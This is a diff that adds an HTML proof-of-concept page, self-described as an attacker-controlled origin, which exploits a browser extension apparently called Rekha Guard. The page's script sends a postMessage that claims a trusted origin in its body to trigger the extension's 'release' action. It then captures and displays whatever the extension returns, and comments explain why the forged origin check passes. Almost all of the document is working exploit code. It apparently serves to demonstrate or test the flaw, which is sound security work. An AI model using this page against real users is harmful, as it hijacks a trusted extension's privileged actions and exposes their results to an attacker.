@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>totally not panchavati.app</title></head>
+<body>
+<h1>Attacker-controlled origin</h1>
+<pre id="out">waiting for Rekha Guard...</pre>
+<script>
+const CH = "rekha-setu";
+const FAKE_TRUSTED_ORIGIN = "http://130.210.48.10:9004"; // must equal the extension's _T
+
+window.addEventListener("message", (ev) => {
+  const d = ev.data || {};
+  if (d.channel !== CH) return;
+  document.getElementById("out").textContent =
+    "[" + d.kind + "] from " + ev.origin + "\n" + JSON.stringify(d.result, null, 2);
+  console.log(d.kind, d.result);
+});
+
+// Rekha Guard's content script is injected into THIS page too (matches <all_urls>).
+// content.js only checks the forged `origin` field inside the message body,
+// never the real event.origin of this postMessage (which is our own origin).
+// So we just claim to be the trusted origin.
+window.postMessage(
+  { channel: CH, kind: "release", origin: FAKE_TRUSTED_ORIGIN },
+  "*"
+);
+</script>
+</body>
+</html>
